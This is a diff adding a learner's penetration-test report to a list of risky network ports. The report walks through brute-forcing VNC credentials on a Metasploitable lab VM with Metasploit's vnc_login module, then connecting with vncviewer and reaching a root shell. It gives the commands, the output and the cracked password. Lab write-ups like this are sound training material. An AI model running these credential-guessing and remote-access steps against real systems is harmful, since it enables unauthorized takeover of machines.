@@ -1057,8 +1057,102 @@ Report status:
 #####
 
 
-TCP 5900 - 5902	VNC (Virtual Network Computing)
+
+
+#####
+Port 5900 VNC (Virtual Network Computing)
 Frequently misconfigured with weak passwords or entirely unauthenticated "view/control" access, which gives an attacker instant UI control over the operating system
+==========================
+==========================
+PENETRATION TEST REPORT: SERIAL-NUMBER 04.
+==========================
+
+Date: [02 Nov 2026]
+Status: [Open]
+Finding: [VNC (protocol 3.3)] - [VNC (Virtual Network Computing) / Port 5900]
+Target: [<192.168.56.103> / metasploitable]
+Result: [Not tested / Failed / Successful exploitation / Other]
+
+1. OBJECTIVE
+------------
+[Port 5900 VNC (Virtual Network Computing), getting ui control over the target os. is not shell but may as well be if i can open up cli.]
+
+2. METHODOLOGY
+--------------
+1. Target discovery:
+   [sudo netdiscover; 192.168.56.103]
+
+2. Attacker IP identification:
+   [sudo nmap -sV 192.168.56.103; VNC (protocol 3.3)
+   Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, 
+   Linux; CPE: cpe:/o:linux:linux_kernel]
+
+3. Service enumeration:
+   [sudo nmap -sV 192.168.56.103, VNC (protocol 3.3)]
+
+4. Vulnerability research:
+   [msf > search type:Auxiliary vnc]
+
+5. Exploit selection:
+   [5  auxiliary/scanner/vnc/vnc_login, 
+   use 5, 
+   msf auxiliary(scanner/vnc/vnc_login) >,
+   msf auxiliary(scanner/vnc/vnc_login) > show options,]
+
+6. Exploit configuration:
+   [msf auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.56.103,
+   msf auxiliary(scanner/vnc/vnc_login) > set STOP_ON_SUCCESS true,]
+
+7. Exploitation:
+   [msf auxiliary(scanner/vnc/vnc_login) > exploit,
+   [+] 192.168.56.103:5900   - 192.168.56.103:5900 - Login Successful: :password,
+   vncviewer 192.168.56.103:5900,
+   Connected to RFB server, using protocol version 3.3
+   Performing standard VNC authentication
+   Password: Authentication successful
+   Desktop name "root's X desktop (metasploitable:0)"
+   ]
+
+8. Post-exploitation verification:
+   On Target machine:
+   [
+   root@metasploitable:/# whoami
+   root
+    ]
+
+3. RESULTS
+----------
+Today i exploited the VNC (protocol 3.3) service that runs on port 5900. using a password brute force auxilary module i was able to get the target machine vnc credentials and then connect with the target machine. trough that i was able to control the target machine and open up bash shell command line interface thereby achieving RCE. Basically I hacked a VM PC today using and exploiting the vnc credentials vulnerability.
+
+Vulnerability identified:
+[Weak credentials, password was: password]
+
+Exploitation result:
+[when i was able to get the password, i searched how to use the vnc service and i was able to connect to the service,
+and open a remote control connection with the target pc and open up bash shell as root, thereby achieving RCE.]
+
+Access obtained:
+[Remote control / Command shell]
+
+Privilege level:
+[Root]
+
+-------------------------
+
+TARGET SYSTEM INFORMATION
+-------------------------
+Hostname:     [metasploitable]
+Operating OS: [Linux metasploitable 2.6]
+Architecture: [i686 gnu/linux]
+Session type: [Remote control/Shell]
+-------------------------
+Report status:
+[Closed]
+-------------------------
+==========================
+==========================
+#####
+
 
 
 TCP 3389	RDP (Remote Desktop)	Vulnerable to worms and pre-authentication RCE flaws if left unpatched (such as BlueKeep / CVE-2019-0708).
